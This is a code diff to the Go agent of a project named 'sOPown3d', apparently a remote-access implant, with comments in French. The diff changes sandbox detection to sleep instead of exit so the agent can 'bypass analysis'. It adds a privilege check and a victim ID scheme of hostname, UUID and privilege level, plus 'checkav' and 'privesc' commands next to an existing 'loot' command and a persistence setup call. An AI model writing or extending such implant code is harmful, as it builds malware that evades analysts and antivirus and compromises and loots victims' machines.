@@ -3,12 +3,15 @@ package agent
 import (
 	"bytes"
 	"context"
+	"crypto/rand"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"log"
 	"net/http"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"runtime"
 	"sOPown3d/internal/agent/evasion"
 	"sOPown3d/internal/agent/persistence"
@@ -41,10 +44,10 @@ func New(cfg Config) (*Agent, error) {
 
 	persistence.SetupPersistence()
 
-	// Check for sandbox/VM and exit if detected
+	// Check for sandbox/VM and sleep if detected to bypass analysis
 	if isSandbox, details := evasion.IsSandbox(); isSandbox {
-		log.Printf("⚠️ SANDBOX DETECTED - EXITING\n%s", details)
-		os.Exit(1)
+		log.Printf("⚠️ SANDBOX DETECTED\n%s", details)
+		evasion.LongSleep()
 	}
 
 	return &Agent{
@@ -87,6 +90,58 @@ func (agent *Agent) Run(ctx context.Context) error {
 	}
 }
 
+// Génère ou récupère l'UUID unique de l'agent
+func getOrCreateAgentUUID() string {
+	// Chemin du fichier UUID (dans le dossier temp ou AppData)
+	var uuidPath string
+	if runtime.GOOS == "windows" {
+		appData := os.Getenv("APPDATA")
+		if appData == "" {
+			appData = os.Getenv("TEMP")
+		}
+		uuidPath = filepath.Join(appData, ".agent_uuid")
+	} else {
+		uuidPath = filepath.Join(os.TempDir(), ".agent_uuid")
+	}
+
+	// Essayer de lire l'UUID existant
+	if data, err := os.ReadFile(uuidPath); err == nil {
+		uuid := strings.TrimSpace(string(data))
+		if len(uuid) == 4 {
+			return uuid
+		}
+	}
+
+	// Générer un nouveau UUID de 4 caractères
+	b := make([]byte, 2)
+	rand.Read(b)
+	uuid := hex.EncodeToString(b) // 4 caractères hex
+
+	// Sauvegarder pour la prochaine fois
+	os.WriteFile(uuidPath, []byte(uuid), 0644)
+
+	return uuid
+}
+
+// Vérifie si l'agent tourne en admin/root
+func isElevated() bool {
+	if runtime.GOOS == "windows" {
+		// Essayer de créer un fichier dans System32
+		testPath := "C:\\Windows\\System32\\test_priv.tmp"
+		err := os.WriteFile(testPath, []byte("test"), 0644)
+		if err == nil {
+			os.Remove(testPath)
+			return true
+		}
+		// Méthode alternative
+		cmd := exec.Command("net", "session")
+		err = cmd.Run()
+		return err == nil
+	}
+	// Unix: vérifier si UID = 0
+	return os.Geteuid() == 0
+}
+
 func gatherSystemInfo() shared.AgentInfo {
 	hostname, _ := os.Hostname()
 	username := os.Getenv("USERNAME")
@@ -94,8 +149,16 @@ func gatherSystemInfo() shared.AgentInfo {
 		username = os.Getenv("USER")
 	}
 
+	// Générer l'ID unique : hostname-uuid-privilege
+	uuid := getOrCreateAgentUUID()
+	privilege := "user"
+	if isElevated() {
+		privilege = "admin"
+	}
+	agentID := fmt.Sprintf("%s-%s-%s", hostname, uuid, privilege)
+
 	return shared.AgentInfo{
-		Hostname: hostname,
+		Hostname: agentID, // Maintenant c'est l'ID complet
 		OS:       runtime.GOOS,
 		Username: username,
 	}
@@ -174,6 +237,12 @@ func executeCommand(cmd *shared.Command) string {
 
 	case "loot":
 		return executeLootCommand()
+
+	case "checkav":
+		return executeCheckAVCommand()
+
+	case "privesc":
+		return executePrivescCommand()
 
 	default:
 		log.Printf("Commande inconnue: %s", cmd.Action)
